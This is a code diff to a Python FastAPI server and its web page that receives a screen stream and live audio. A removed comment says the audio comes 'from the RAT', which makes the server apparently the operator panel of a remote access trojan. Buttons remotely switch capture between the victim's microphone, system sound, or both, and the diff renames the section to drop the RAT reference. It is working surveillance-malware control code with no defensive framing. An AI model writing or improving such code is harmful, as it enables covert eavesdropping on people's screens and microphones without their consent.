@@ -26,7 +26,7 @@ async def stream():
             await asyncio.sleep(0.1)
     return StreamingResponse(generate(), media_type="multipart/x-mixed-replace; boundary=frame")
 
-# ---------- АУДИО (ретрансляция от RAT к браузерам) ----------
+# ---------- АУДИО РЕТРАНСЛЯЦИЯ ----------
 audio_connections: List[WebSocket] = []
 
 @app.websocket("/ws/audio")
@@ -37,7 +37,7 @@ async def websocket_audio(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_bytes()
-            # Рассылаем всем остальным
+            # Рассылаем всем подключённым браузерам (исключая отправителя)
             for conn in audio_connections:
                 if conn != websocket:
                     try:
@@ -45,7 +45,8 @@ async def websocket_audio(websocket: WebSocket):
                     except:
                         pass
     except WebSocketDisconnect:
-        audio_connections.remove(websocket)
+        if websocket in audio_connections:
+            audio_connections.remove(websocket)
         print(f"[WS Audio] Клиент отключен, всего: {len(audio_connections)}")
 
 # ---------- УПРАВЛЕНИЕ ----------
@@ -67,14 +68,14 @@ async def websocket_control(websocket: WebSocket):
     except WebSocketDisconnect:
         control_connections.remove(websocket)
 
-# ---------- ВЕБ-СТРАНИЦА (с кнопкой запуска звука) ----------
+# ---------- ВЕБ-СТРАНИЦА С ОТЛАДКОЙ ----------
 @app.get("/", response_class=HTMLResponse)
 async def index():
     html = """
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Screen + Audio Stream</title>
+        <title>Screen + Audio</title>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
@@ -88,6 +89,8 @@ async def index():
             .btn.start { background: #9C27B0; color: white; }
             .btn.active { box-shadow: 0 0 15px #fff; }
             #status { color: #aaa; margin-top: 10px; font-family: monospace; }
+            #audio-indicator { display: inline-block; width: 12px; height: 12px; border-radius: 50%; background: #555; margin-left: 10px; }
+            #audio-indicator.active { background: #0f0; box-shadow: 0 0 10px #0f0; }
         </style>
     </head>
     <body>
@@ -98,57 +101,92 @@ async def index():
             <button id="systemBtn" class="btn system">🔉 Системный</button>
             <button id="bothBtn" class="btn both">🎧 Микрофон+Системный</button>
         </div>
-        <div id="status">🔊 Audio: waiting for start...</div>
+        <div id="status">🔊 Audio: waiting for start... <span id="audio-indicator"></span></div>
 
         <script>
-            // Подключение к управляющему WebSocket
-            const controlWs = new WebSocket(`ws://${window.location.host}/ws/control`);
-            controlWs.onopen = () => document.getElementById('status').textContent = '🔊 Control connected';
-            controlWs.onclose = () => document.getElementById('status').textContent = '🔊 Control disconnected';
+            (function() {
+                const statusDiv = document.getElementById('status');
+                const indicator = document.getElementById('audio-indicator');
+                const log = (msg) => { console.log('[Audio]', msg); statusDiv.textContent = '🔊 ' + msg; };
 
-            function sendMode(mode) {
-                const cmd = JSON.stringify({ mode: mode });
-                controlWs.send(cmd);
-                document.querySelectorAll('.btn').forEach(b => b.classList.remove('active'));
-                if (mode === 'mic') document.getElementById('micBtn').classList.add('active');
-                else if (mode === 'system') document.getElementById('systemBtn').classList.add('active');
-                else if (mode === 'both') document.getElementById('bothBtn').classList.add('active');
-            }
+                // Подключение к управляющему WebSocket
+                const controlWs = new WebSocket(`ws://${window.location.host}/ws/control`);
+                controlWs.onopen = () => log('Control connected');
+                controlWs.onclose = () => log('Control disconnected');
 
-            document.getElementById('micBtn').onclick = () => sendMode('mic');
-            document.getElementById('systemBtn').onclick = () => sendMode('system');
-            document.getElementById('bothBtn').onclick = () => sendMode('both');
-
-            // Аудио – отложенный старт по кнопке
-            const audioWs = new WebSocket(`ws://${window.location.host}/ws/audio`);
-            audioWs.binaryType = 'arraybuffer';
-            let audioCtx = null;
-            let nextStartTime = 0;
-
-            document.getElementById('startBtn').onclick = () => {
-                if (!audioCtx) {
-                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    nextStartTime = audioCtx.currentTime;
-                    document.getElementById('status').textContent = '🔊 Audio: started';
+                function sendMode(mode) {
+                    controlWs.send(JSON.stringify({ mode }));
+                    document.querySelectorAll('.btn').forEach(b => b.classList.remove('active'));
+                    document.getElementById(mode + 'Btn')?.classList.add('active');
                 }
-                audioCtx.resume().then(() => {
-                    document.getElementById('status').textContent = '🔊 Audio: playing';
-                });
-            };
 
-            const sampleRate = 16000;
-            audioWs.onmessage = (event) => {
-                if (!audioCtx || audioCtx.state === 'suspended') return;
-                const data = new Int16Array(event.data);
-                const audioBuffer = audioCtx.createBuffer(1, data.length, sampleRate);
-                audioBuffer.getChannelData(0).set(data.map(v => v / 32768.0));
-                const source = audioCtx.createBufferSource();
-                source.buffer = audioBuffer;
-                source.connect(audioCtx.destination);
-                if (nextStartTime < audioCtx.currentTime) nextStartTime = audioCtx.currentTime;
-                source.start(nextStartTime);
-                nextStartTime += audioBuffer.duration;
-            };
+                document.getElementById('micBtn').onclick = () => sendMode('mic');
+                document.getElementById('systemBtn').onclick = () => sendMode('system');
+                document.getElementById('bothBtn').onclick = () => sendMode('both');
+
+                // Аудио
+                const audioWs = new WebSocket(`ws://${window.location.host}/ws/audio`);
+                audioWs.binaryType = 'arraybuffer';
+                let audioCtx = null;
+                let nextStartTime = 0;
+                let dataReceived = false;
+
+                document.getElementById('startBtn').onclick = async () => {
+                    try {
+                        if (!audioCtx) {
+                            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                            log('AudioContext создан, состояние: ' + audioCtx.state);
+                            nextStartTime = audioCtx.currentTime;
+                        }
+                        if (audioCtx.state === 'suspended') {
+                            await audioCtx.resume();
+                            log('AudioContext возобновлён, состояние: ' + audioCtx.state);
+                        } else {
+                            log('AudioContext уже активен: ' + audioCtx.state);
+                        }
+                    } catch (e) {
+                        log('Ошибка запуска AudioContext: ' + e.message);
+                    }
+                };
+
+                const sampleRate = 16000;
+                audioWs.onopen = () => log('Audio WebSocket открыт');
+                audioWs.onclose = () => log('Audio WebSocket закрыт');
+                audioWs.onerror = (e) => log('Audio WebSocket ошибка: ' + e);
+
+                audioWs.onmessage = (event) => {
+                    if (!audioCtx || audioCtx.state !== 'running') {
+                        log('Данные получены, но AudioContext не запущен');
+                        return;
+                    }
+                    try {
+                        const data = new Int16Array(event.data);
+                        if (data.length === 0) return;
+                        dataReceived = true;
+                        // Индикатор
+                        indicator.classList.add('active');
+                        setTimeout(() => indicator.classList.remove('active'), 100);
+
+                        const audioBuffer = audioCtx.createBuffer(1, data.length, sampleRate);
+                        const channelData = audioBuffer.getChannelData(0);
+                        for (let i = 0; i < data.length; i++) {
+                            channelData[i] = data[i] / 32768.0;
+                        }
+                        const source = audioCtx.createBufferSource();
+                        source.buffer = audioBuffer;
+                        source.connect(audioCtx.destination);
+                        if (nextStartTime < audioCtx.currentTime) nextStartTime = audioCtx.currentTime;
+                        source.start(nextStartTime);
+                        nextStartTime += audioBuffer.duration;
+                        if (!dataReceived) {
+                            log('Первый аудиобуфер отправлен в динамик');
+                            dataReceived = true;
+                        }
+                    } catch (e) {
+                        log('Ошибка обработки аудио: ' + e.message);
+                    }
+                };
+            })();
         </script>
     </body>
     </html>
